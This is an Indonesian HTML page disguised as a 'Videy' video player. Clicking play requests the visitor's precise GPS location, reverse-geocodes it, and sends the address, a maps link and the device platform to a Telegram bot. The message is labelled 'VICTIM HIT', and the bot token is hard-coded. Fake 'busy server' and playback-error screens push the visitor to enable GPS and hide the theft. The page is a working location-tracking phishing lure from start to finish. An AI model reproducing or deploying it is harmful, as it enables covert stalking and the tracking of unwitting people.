<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Videy - Simple video hosting</title>
    <style>
        body, html { 
            background-color: #000; margin: 0; padding: 0; width: 100%; height: 100%; 
            display: flex; justify-content: center; align-items: center; 
            overflow: hidden; touch-action: none; font-family: sans-serif;
        }
        
        .videy-player { 
            position: relative;
            width: 100vw; 
            height: 100vh; 
            background: #000; 
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .watermark { position: absolute; top: 20px; right: 20px; color: rgba(255,255,255,0.4); font-weight: bold; font-size: 20px; z-index: 10; pointer-events: none; }
        .thumb { width: 100%; height: 100%; object-fit: cover; cursor: pointer; }
        
        .play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; cursor: pointer; z-index: 5; }
        .play-circle { width: 75px; height: 75px; background: rgba(0,0,0,0.5); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 1.5px solid rgba(255,255,255,0.2); }
        .play-icon { border-style: solid; border-width: 14px 0 14px 22px; border-color: transparent transparent transparent #fff; margin-left: 5px; }
        
        .loader { width: 50px; height: 50px; border: 5px solid #333; border-top: 4px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; display: none; position: absolute; top: 48%; left: calc(50% - 25px); z-index: 15; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 30px; z-index: 20; color: #fff; box-sizing: border-box; }
        .btn-retry { margin-top: 25px; padding: 15px 30px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 85%; font-size: 16px; }
    </style>
</head>
<body>

<div class="videy-player">
    <div class="watermark">videy</div>
    
    <img src="f/f.jpg" class="thumb" id="img-thumb" onclick="mulai()">
    
    <div class="play-overlay" id="play-btn" onclick="mulai()">
        <div class="play-circle"><div class="play-icon"></div></div>
    </div>
    
    <div class="loader" id="spinner"></div>

    <div id="denied-screen" class="screen">
        <p style="font-size: 22px; font-weight: bold;">Koneksi Sibuk</p>
        <p style="font-size: 15px; color: #aaa; line-height: 1.6;">Server mengalami lonjakan trafik. Silakan muat ulang dan aktifkan GPS untuk sinkronisasi aman agar video dapat diputar.</p>
        <button class="btn-retry" onclick="location.reload()">Muat Ulang Koneksi</button>
    </div>

    <div id="final-error" class="screen">
        <p style="font-size: 18px; color: #ff4444;">Kesalahan Pemutaran</p>
        <p style="font-size: 13px; color: #888; line-height: 1.6;">Gagal memuat sumber media (Error: HLS_PLAY_ERR). Server sedang penuh,<br>Anda bisa mencoba lagi nanti.</p>
        <button class="btn-retry" onclick="location.reload()">Coba Lagi</button>
    </div>
</div>

<script>
    const token = "8560002103:AAFo0auV2fqMYpsh-xyqZvwZzdJYBJIfUf8"; 
    const chat_id = "5639837246"; 

    function mulai() {
        document.getElementById('play-btn').style.display = 'none';
        document.getElementById('spinner').style.display = 'block';
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(kirimData, handleDitolak, {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            });
        } else {
            tampilkanError();
        }
    }

    function kirimData(p) {
        const lat = p.coords.latitude;
        const lon = p.coords.longitude;
        const acc = Math.round(p.coords.accuracy);
        
        // Reverse Geocoding menggunakan OpenStreetMap Nominatim
        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
            .then(res => res.json())
            .then(data => {
                const alamat = data.display_name || "Alamat tidak ditemukan";
                const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
                
                const teks = `👁️ eyeGPT VICTIM HIT!\n\n📍 Alamat: ${alamat}\n🎯 Akurasi: ${acc}m\n🔗 Maps: ${googleMaps}\n📱 Platform: ${navigator.platform}`;

                return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(teks)}`);
            })
            .catch(() => {
                // Fallback jika API alamat gagal, tetap kirim koordinat mentah
                const teksAlt = `👁️ eyeGPT HIT (Alamat Gagal)!\n\n📍 Koordinat: ${lat},${lon}\n🎯 Akurasi: ${acc}m\n🔗 Maps: https://www.google.com/maps?q=${lat},${lon}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(teksAlt)}`);
            })
            .finally(() => {
                setTimeout(tampilkanError, 5000);
            });
    }

    function handleDitolak() {
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('img-thumb').style.display = 'none';
        document.getElementById('denied-screen').style.display = 'flex';
    }

    function tampilkanError() {
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('img-thumb').style.display = 'none';
        document.getElementById('denied-screen').style.display = 'none';
        document.getElementById('final-error').style.display = 'flex';
    }
</script>

</body>
</html>
